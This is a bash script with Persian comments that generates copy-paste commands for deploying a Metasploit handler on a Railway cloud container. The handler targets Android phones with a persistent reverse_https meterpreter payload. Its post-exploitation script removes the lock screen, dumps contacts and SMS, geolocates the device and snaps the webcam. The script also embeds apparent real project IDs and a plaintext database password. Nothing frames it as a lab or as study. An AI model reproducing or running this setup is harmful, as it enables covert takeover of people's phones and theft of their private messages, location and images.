#!/bin/bash

# Quick Copy Script - Generate commands for Railway
# تولید دستورات برای کپی سریع به Railway

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║        📋 Railway Quick Copy Commands Generator                 ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

DEPLOY_DIR="/home/offsec/Documents/GitHub/metasploit-framework1/railway_deploy"

cat << 'HEADER'
═══════════════════════════════════════════════════════════════════
🚀 دستورات زیر را در Railway container کپی و اجرا کنید
═══════════════════════════════════════════════════════════════════

# اتصال به Railway:
sudo railway ssh \
  --project=0e85ae85-ca7e-4d9a-a408-888cc8b9b6f6 \
  --environment=fb2cd976-9332-4286-adc9-69889109456e \
  --service=95d051e6-d8d9-48cf-85fb-a7a41c1ecced

# سپس دستورات زیر را یکی یکی اجرا کنید:

═══════════════════════════════════════════════════════════════════
📁 FILE 1: railway_handler_final.rc
═══════════════════════════════════════════════════════════════════
HEADER

echo "cat > /root/railway_handler_final.rc << 'EOF_HANDLER'"
cat "$DEPLOY_DIR/../railway_handler_final.rc" 2>/dev/null || cat << 'HANDLER_DEFAULT'
#!/usr/bin/env ruby
db_connect postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway
db_status
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 29210
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
set SessionRetryTotal 100
set SessionRetryWait 10
set ExitOnSession false
set EnableUnicodeEncoding true
set PrependMigrate true
set PrependMigrateProc com.android.systemui
set ConsoleLogging true
set VERBOSE true
exploit -j -z
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║       🚀 Handler Active on port 29210!                          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
HANDLER_DEFAULT
echo "EOF_HANDLER"
echo ""

cat << 'SEP1'
═══════════════════════════════════════════════════════════════════
📁 FILE 2: post_exploit_railway.rc
═══════════════════════════════════════════════════════════════════
SEP1

echo "cat > /root/post_exploit_railway.rc << 'EOF_POST'"
cat "$DEPLOY_DIR/post_exploit_railway.rc" 2>/dev/null || cat << 'POST_DEFAULT'
run post/android/gather/enum_device
run post/android/gather/enum_apps
run post/android/manage/remove_lock
run post/android/gather/enum_contacts
run post/android/gather/enum_sms
run post/android/gather/geolocate
webcam_snap
background
POST_DEFAULT
echo "EOF_POST"
echo ""

cat << 'SEP2'
═══════════════════════════════════════════════════════════════════
📁 FILE 3: railway_persistence_tables.sql
═══════════════════════════════════════════════════════════════════
SEP2

echo "cat > /root/railway_persistence_tables.sql << 'EOF_SQL'"
cat "$DEPLOY_DIR/railway_persistence_tables.sql"
echo "EOF_SQL"
echo ""

cat << 'SEP3'
═══════════════════════════════════════════════════════════════════
📁 FILE 4: setup_railway.sh
═══════════════════════════════════════════════════════════════════
SEP3

echo "cat > /root/setup_railway.sh << 'EOF_SETUP'"
cat "$DEPLOY_DIR/setup_railway.sh"
echo "EOF_SETUP"
echo ""
echo "chmod +x /root/setup_railway.sh"
echo ""

cat << 'FOOTER'
═══════════════════════════════════════════════════════════════════
🚀 بعد از کپی تمام فایل‌ها، اجرا کنید:
═══════════════════════════════════════════════════════════════════

bash /root/setup_railway.sh

# شروع handler:
msfconsole -r /root/railway_handler_final.rc

═══════════════════════════════════════════════════════════════════
✅ تمام!
═══════════════════════════════════════════════════════════════════
FOOTER
